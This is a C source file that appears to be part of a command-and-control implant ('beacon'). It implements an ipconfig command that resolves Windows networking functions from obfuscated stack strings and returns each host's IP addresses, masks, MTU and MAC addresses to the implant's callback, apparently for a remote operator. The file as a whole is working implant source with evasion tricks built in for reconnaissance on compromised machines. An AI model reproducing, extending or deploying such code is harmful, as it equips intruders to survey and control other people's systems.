#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>

#include "commands.h"
#include "parse.h"
#include "beacon.h"
#include "bformat.h"

HANDLE iphlpmod = INVALID_HANDLE_VALUE;

typedef DWORD(WINAPI *Func_GetIfEntry)(PMIB_IFROW);
typedef DWORD(WINAPI *Func_GetIpAddrTable)(PMIB_IPADDRTABLE, PULONG, BOOL);

/* this function is a callback [only] to enable an interface chooser for Covert VPN */
void command_ipconfig(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	PMIB_IPADDRTABLE table = NULL;
	DWORD tableSize = sizeof(MIB_IPADDRROW) * 33;
	DWORD index;
	MIB_IFROW iface;
	IN_ADDR IPAddr;
	int j;

	/* functions to resolve */
	char libname[] = { 'I', 'P', 'H', 'L', 'P', 'A', 'P', 'I', 0 };
	char fgetifentry[] = { 'G', 'e', 't', 'I', 'f', 'E', 'n', 't', 'r', 'y', 0 };
	char fgetipaddrtable[] = { 'G', 'e', 't', 'I', 'p', 'A', 'd', 'd', 'r', 'T', 'a', 'b', 'l', 'e', 0 };
	Func_GetIfEntry pGetIfEntry;
	Func_GetIpAddrTable pGetIpAddrTable;

	formatp format;
	datap  parser;
	int    reqid;

	/* load the module, please */
	if (iphlpmod == INVALID_HANDLE_VALUE)
		iphlpmod = LoadLibrary(libname);

	/* load our functions! */
	pGetIfEntry     = (Func_GetIfEntry)GetProcAddress(iphlpmod, fgetifentry);
	pGetIpAddrTable = (Func_GetIpAddrTable)GetProcAddress(iphlpmod, fgetipaddrtable);

	if (pGetIfEntry == NULL || pGetIpAddrTable == NULL)
		return;

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* extract our callback ID */
	reqid = data_int(&parser);

	/* init our output buffer */
	bformat_init(&format, 32768);

	/* copy the callback ID to our output */
	bformat_int(&format, reqid);

	/* Allocate memory for reading addresses into */
	if (!(table = (PMIB_IPADDRTABLE)malloc(tableSize))) {
		bformat_free(&format);
		return;
	}

	/* Get the IP address table */
	if (pGetIpAddrTable(table, &tableSize, TRUE) != NO_ERROR) {
		bformat_free(&format);
		return;
	}

	for (index = 0; index < table->dwNumEntries; index++) {
		iface.dwIndex = table->table[index].dwIndex;

		/* only grab interfaces likely to be of interest to us */
		if (pGetIfEntry(&iface) == NO_ERROR && iface.dwPhysAddrLen > 0) {
			/* add interface address */
			IPAddr.S_un.S_addr = (u_long)table->table[index].dwAddr;
			bformat_printf(&format, "%s\t", inet_ntoa(IPAddr));

			/* add interface mask */
			IPAddr.S_un.S_addr = (u_long)table->table[index].dwMask;
			bformat_printf(&format, "%s\t", inet_ntoa(IPAddr));

			/* MTU of interface */
			bformat_printf(&format, "%ld\t", iface.dwMtu);

			/* add HW address */
			for (j = 0; j < iface.dwPhysAddrLen; j++) {
				if (j == (iface.dwPhysAddrLen - 1))
					bformat_printf(&format, "%.2X", (int)iface.bPhysAddr[j]);
				else
					bformat_printf(&format, "%.2X:", (int)iface.bPhysAddr[j]);
			}

			bformat_printf(&format, "\n");
		}
	}

	callback(bformat_string(&format), bformat_length(&format), CALLBACK_PENDING);

	if (table)
		free(table);

	bformat_free(&format);
}